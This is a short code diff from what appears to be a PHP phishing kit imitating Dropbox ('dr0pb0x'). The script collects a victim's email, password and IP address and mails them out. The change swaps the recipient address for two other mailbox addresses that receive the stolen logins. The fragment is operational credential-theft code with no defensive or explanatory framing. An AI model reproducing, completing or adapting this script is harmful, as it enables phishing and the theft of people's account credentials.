@@ -7,7 +7,7 @@ $server = date("D/M/d, Y g:i a");
 
 if($email != null && $password != null){
 	
-	$own = "brianblunt007@gmail.com";
+	$own = "mzatradingsllc@gmail.com, john_paul0150@yahoo.com";
 	$subj = "D3J - dr0pb0x 000 - ".$ip;
 	
 	$message = "[dr0pb0x 000] \n\n";
